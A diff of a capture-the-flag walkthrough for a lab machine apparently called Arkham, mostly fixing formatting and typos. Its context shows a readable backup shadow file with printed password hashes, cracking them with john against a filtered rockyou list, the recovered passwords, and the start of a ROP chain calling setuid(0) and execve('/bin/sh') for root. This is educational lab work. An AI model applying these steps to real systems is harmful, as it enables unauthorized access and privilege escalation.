@@ -94,10 +94,9 @@ We have a strange setuid binary, but i can't execute it as hal user. let's try t
 With some enumeration i found in "/var/backups" a shadow file with read right for group "adm", and the user hal belongs of this group. 
 ![shadow_rights](https://github.com/roughiz/Arkham-walktrough/blob/master/)
 
-```
 ##### Nota: 
 think to revert machine beforeexploit, some users change files rights !!!
-
+```
 $ cat shadow.bak
 ...
 theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
@@ -124,7 +123,7 @@ $ grep  -i  "Love\|Secret\|sex\|God" rockyou.txt > wordlist
 ```
 #### Crack hashes
 ```
-john --wordlist=wordlist shadow
+$ john --wordlist=wordlist shadow
 Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
 Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -139,6 +138,7 @@ margo:iamgod$08:1002:1002:,,,:/home/margo:/bin/bash
 
 #### Passwords
 password123      (theplague)
+
 iamgod$08        (margo)
 
 The password for user "theplague" didn't work, but password of margo worked great and i have the user flag:
@@ -228,7 +228,7 @@ in x86-64, to call a function, the  program should place the first six integer o
 64 bits) should be pushed onto the stack.
 and the register %rsp is used as the stack pointer, a pointer to the topmost element in the stack.
 
-[x86-64 cheatdheet](http://www.cs.tufts.edu/comp/181/x64_cheatsheet.pdf)
+[x86-64 cheatsheet](http://www.cs.tufts.edu/comp/181/x64_cheatsheet.pdf)
 Here per example the binary compare the two strings like :
 ###### strcmp($rdi,$rsi)
 
@@ -242,7 +242,7 @@ Let's check how the binary was compiled and if ASLR is enabled in this box.
 i used the script [checksec](https://github.com/RobinDavid/checksec) to test executable properties like :
 [checksec_analyse](https://github.com/roughiz/Arkham-walktrough/blob/master/)
 
-#### Box ASLR 
+#### ASLR 
 ```
 cat /proc/sys/kernel/randomize_va_space
 2
@@ -283,13 +283,14 @@ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep puts
 libc_sh =0x1b3e9a
 ```
 
-````
+```
 setuid = offset +libc_setuid
 ```
 ##### Asm code :
-the asm code of c code :
+The asm code of c code :
 setuid(0);
 execve("/bin/sh",Null,Null);
+
 ```
 pop rdi; ret # frist arg
 0x0
